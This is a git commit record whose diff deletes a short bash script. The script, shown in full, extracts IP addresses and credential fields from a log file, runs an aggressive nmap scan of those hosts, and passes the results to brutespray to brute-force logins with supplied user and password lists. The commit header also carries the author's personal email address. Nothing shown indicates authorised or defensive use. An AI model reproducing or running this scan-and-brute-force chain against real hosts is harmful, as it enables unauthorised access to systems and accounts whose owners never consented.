cf5a5ae726eb883d3d42526360be35715d00b6b7
wolf1892 <manishsingh239@gmail.com>
2021-01-02 20:49:59 +0530

    Delete script.sh

--- script.sh
+++
@@ -1,5 +0,0 @@
-#!/bin/bash
-awk '{print $4}' bap.log > cred.txt
-awk '{print $1}' bap.log > ip.txt
-nmap -sT -A -iL ip.txt -oG host.gnmap
-brutespray --file host.gnmap -U user.txt -P pass.txt --threads 5 --hosts 5
